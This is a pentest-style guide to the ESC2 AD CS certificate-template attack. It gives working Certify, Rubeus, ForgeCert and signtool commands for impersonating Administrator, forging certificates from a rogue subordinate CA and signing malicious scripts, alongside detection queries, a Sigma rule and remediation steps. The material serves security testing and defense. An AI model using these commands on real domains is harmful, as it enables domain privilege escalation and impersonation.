# ESC2 - Misconfigured Certificate Templates (Any Purpose / SubCA)

## Attack Overview

ESC2 exploits certificate templates configured with:
1. **Any Purpose EKU** (OID: 2.5.29.37.0) or **No EKU** defined
2. **Subordinate CA** certificate template misconfiguration
3. Enrollment rights for low-privileged users

Templates with "Any Purpose" EKU can be used for ANY authentication purpose, including domain authentication, code signing, email encryption, etc.

---

## Prerequisites

- Domain user credentials
- Network access to Certificate Authority
- Vulnerable certificate template with:
  - Any Purpose EKU (2.5.29.37.0) OR No EKU specified
  - Enrollment rights for authenticated users
  - No manager approval required

---

## Vulnerability Conditions

### ESC2 Variant 1: Any Purpose EKU
```
✓ msPKI-Certificate-Application-Policy contains "Any Purpose" (2.5.29.37.0)
✓ Low-privileged users can enroll
✓ Manager approval disabled
```

### ESC2 Variant 2: No EKU Specified
```
✓ No EKUs defined in template
✓ Low-privileged users can enroll
✓ Manager approval disabled
```

### ESC2 Variant 3: Subordinate CA
```
✓ Template allows Subordinate CA certificates
✓ Low-privileged users can enroll
✓ Can be used to issue arbitrary certificates
```

---

## Attack Chain

### Phase 1: Enumeration

#### Using Certify
```powershell
# Find ESC2 vulnerable templates
.\Certify.exe find /vulnerable

# Example output for ESC2
[*] Template Name: AnyPurposeTemplate
    Template Permissions:
      NT AUTHORITY\Authenticated Users: Enroll
    Manager Approval: Disabled
    Application Policies: Any Purpose
    Vulnerabilities: ESC2
```

#### Using Certipy
```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.10.10.10 -vulnerable -stdout | grep -A 20 "ESC2"
```

#### Manual PowerShell Enumeration
```powershell
# Get certificate templates
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplatesPath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
$Templates = Get-ADObject -SearchBase $TemplatesPath -Filter * -Properties *

foreach ($Template in $Templates) {
    $EKUs = $Template.'msPKI-Certificate-Application-Policy'

    # Check for Any Purpose EKU (2.5.29.37.0)
    if ($EKUs -contains "2.5.29.37.0") {
        Write-Host "[!] ESC2 - Any Purpose EKU: $($Template.Name)" -ForegroundColor Red
    }

    # Check for no EKU specified
    if ($null -eq $EKUs -or $EKUs.Count -eq 0) {
        Write-Host "[!] ESC2 - No EKU Specified: $($Template.Name)" -ForegroundColor Yellow
    }
}
```

---

### Phase 2: Exploitation

#### Scenario 1: Any Purpose EKU Exploitation

**Step 1: Request Certificate**
```powershell
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:AnyPurposeTemplate /altname:Administrator
```

**Step 2: Use for Authentication**
```powershell
# Convert to PFX
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:AnyPurposeTemplate /altname:Administrator /pfx:admin.pfx

# Authenticate with certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt
```

#### Scenario 2: No EKU Template Exploitation

When no EKU is specified, the certificate can be used for multiple purposes:

```powershell
# Request certificate
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:NoEKUTemplate

# Certificate can be used for:
# - Client authentication
# - Server authentication
# - Code signing
# - Email protection
# - Any other purpose
```

**Use for Client Authentication:**
```powershell
# If ENROLLEE_SUPPLIES_SUBJECT is also enabled
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:NoEKUTemplate /altname:Administrator

# Authenticate
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt
```

#### Scenario 3: Subordinate CA Exploitation

**Most Dangerous ESC2 Variant** - Allows creating a rogue CA that can issue arbitrary certificates.

**Step 1: Request Subordinate CA Certificate**
```powershell
# Using Certify
.\Certify.exe request /ca:DC01.corp.local\corp-DC01-CA /template:SubCA

# OR using certreq
certreq -new subca.inf subca.req
certreq -submit -config "DC01.corp.local\corp-DC01-CA" -attrib "CertificateTemplate:SubCA" subca.req subca.cer
```

**subca.inf example:**
```ini
[NewRequest]
Subject = "CN=Rogue SubCA"
KeyLength = 4096
Exportable = TRUE
MachineKeySet = FALSE
SMIME = False
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0

[Extensions]
2.5.29.19 = "{text}CA=1"  ; Basic Constraints - This is a CA
```

**Step 2: Create Rogue CA and Issue Certificates**

Using **ForgeCert** or custom tooling:
```powershell
# Using ForgeCert to create arbitrary certificates from SubCA
.\ForgeCert.exe --CaCertPath subca.cer --CaCertPassword password --Subject "CN=Administrator" --SubjectAltName "Administrator@corp.local" --NewCertPath admin-forged.pfx --NewCertPassword password
```

**Step 3: Authenticate with Forged Certificate**
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:admin-forged.pfx /password:password /ptt
```

---

### Phase 3: Advanced Exploitation

#### Chain with Other Techniques

**ESC2 + Code Signing:**
```powershell
# Use Any Purpose certificate for code signing
# Sign malicious PowerShell scripts that will be trusted
signtool sign /f anypurpose.pfx /p password /fd SHA256 malicious.ps1
```

**ESC2 + Email Exploitation:**
```powershell
# Use certificate for S/MIME email spoofing
# Send emails appearing to be from executives
```

**ESC2 + Server Authentication:**
```powershell
# Use certificate for server authentication
# Set up rogue services that appear legitimate
```

---

## Detection

### Event Logs to Monitor

**Security Event 4886/4887** - Certificate Requests
```xml
EventID: 4886, 4887
Look for:
  - Template names with "Any Purpose" or missing EKU
  - Requests for Subordinate CA certificates
  - Unusual requesters for CA certificates
```

**Security Event 4768** - Kerberos TGT with Certificate
```xml
EventID: 4768
Pre-Authentication Type: Public Key (16)
Look for:
  - Privileged account names
  - Certificate thumbprints from unknown CAs
```

### Detection Queries

#### Splunk - Detect SubCA Requests
```spl
index=windows EventCode=4886
| rex field=Message "Template:\s+(?<Template>[^\n]+)"
| where Template="SubCA" OR Template="Subordinate Certification Authority"
| rex field=Message "Requester:\s+(?<Requester>[^\n]+)"
| table _time, Requester, Template, Computer
| where Requester!="CA-Server$"
```

#### KQL - Any Purpose Certificate Issuance
```kql
SecurityEvent
| where EventID == 4887
| extend Template = extract("Template:\\s+([^\\n]+)", 1, EventData)
| extend Requester = extract("Requester:\\s+([^\\n]+)", 1, EventData)
| where Template contains "AnyPurpose" or Template contains "SubCA"
| project TimeGenerated, Requester, Template, Computer
```

### Sigma Rule
```yaml
title: ESC2 Subordinate CA Certificate Request
description: Detects requests for Subordinate CA certificates from non-CA systems
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4886
  template:
    - 'SubCA'
    - 'Subordinate Certification Authority'
  filter_ca_servers:
    Workstation: 'CA-SERVER'
  condition: selection and template and not filter_ca_servers
level: critical
```

---

## Remediation

### Immediate Actions

1. **Identify and Disable Vulnerable Templates**
```powershell
# PowerShell script to find ESC2 templates
$ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$TemplatesPath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"

Get-ADObject -SearchBase $TemplatesPath -Filter * -Properties * | Where-Object {
    $_.'msPKI-Certificate-Application-Policy' -contains "2.5.29.37.0" -or
    $_.'msPKI-Certificate-Application-Policy'.Count -eq 0
} | ForEach-Object {
    Write-Host "Disabling: $($_.Name)"
    Set-ADObject $_ -Replace @{"flags"="130"}  # Disable template
}
```

2. **Revoke Suspicious Certificates**
```powershell
# On CA server - Revoke Any Purpose certificates issued to regular users
certutil -view -restrict "CertificateTemplate=AnyPurposeTemplate" -out "SerialNumber,RequesterName"

# Revoke each suspicious certificate
certutil -revoke <SerialNumber> 1  # Reason: KeyCompromise
```

3. **Hunt for Subordinate CA Certificates**
```powershell
# Find all SubCA certificates issued
certutil -view -restrict "CertificateTemplate=SubCA" -out "SerialNumber,RequesterName,NotAfter"

# Investigate each - legitimate SubCAs should be rare
```

---

### Long-Term Hardening

#### Fix Template Configurations

**1. Replace "Any Purpose" with Specific EKUs**
```powershell
# Certificate Templates Console (certtmpl.msc)
# Template Properties → Extensions → Application Policies → Edit

# Remove: Any Purpose (2.5.29.37.0)
# Add specific EKUs only:
#   - Client Authentication (1.3.6.1.5.5.7.3.2) if needed
#   - Smart Card Logon (1.3.6.1.4.1.311.20.2.2) if needed
```

**2. Restrict Subordinate CA Template**
```powershell
# Remove enrollment rights for regular users
# Subordinate CA should only be requested by CA administrators

# In Certificate Templates Console:
# SubCA Properties → Security
# Remove: Domain Users, Authenticated Users
# Add: Enterprise Admins (Enroll permission only)
```

**3. Enable Manager Approval**
```powershell
# For sensitive templates
# Template Properties → Issuance Requirements
# ☑ CA certificate manager approval
```

**4. Monitoring and Alerting**
```powershell
# Configure alerts for:
# - Any SubCA certificate requests
# - Certificates with Any Purpose EKU issued
# - Certificates used for authentication with unexpected EKUs
```

---

## Prevention Best Practices

### Template Configuration Standards

```yaml
Certificate Template Security Standards:

High-Privilege Authentication Templates:
  - Specific EKUs only (no Any Purpose)
  - Restricted enrollment groups
  - Manager approval enabled
  - Limited validity period (≤ 1 year)
  - Regular audits

Subordinate CA Templates:
  - Enterprise Admins only
  - Manager approval mandatory
  - Authorized signatures required
  - Extended validation process
  - Logged and monitored

Code Signing Templates:
  - Separate from authentication templates
  - Hardware-backed keys required
  - Manager approval enabled
  - Extended validation
```

### Audit Checklist

- [ ] No templates with "Any Purpose" EKU for general use
- [ ] All templates have specific, appropriate EKUs defined
- [ ] SubCA template restricted to CA admins only
- [ ] Regular certificate issuance reviews
- [ ] Monitoring for unexpected EKU usage
- [ ] Certificate transparency logging enabled

---

## Tools and Scripts

### Enumeration Script
```powershell
# .\scripts\enumeration\Find-ESC2.ps1
Get-ADObject -SearchBase "CN=Certificate Templates,..." -Filter * -Properties * |
    Where-Object {
        $_.'msPKI-Certificate-Application-Policy' -contains "2.5.29.37.0"
    } | Select-Object Name, Created, Modified
```

### Remediation Script
```powershell
# .\scripts\defense\Fix-ESC2.ps1
# Automated ESC2 remediation with backups and logging
```

---

## References

- [SpecterOps - Certified Pre-Owned (ESC2)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [ForgeCert - Subordinate CA Exploitation](https://github.com/GhostPack/ForgeCert)
- [Microsoft - Certificate Templates Application Policies](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn786429(v=ws.11))

---

**Author**: ADCS Attack Research
**Last Updated**: November 2025
**Classification**: Authorized Security Testing Only
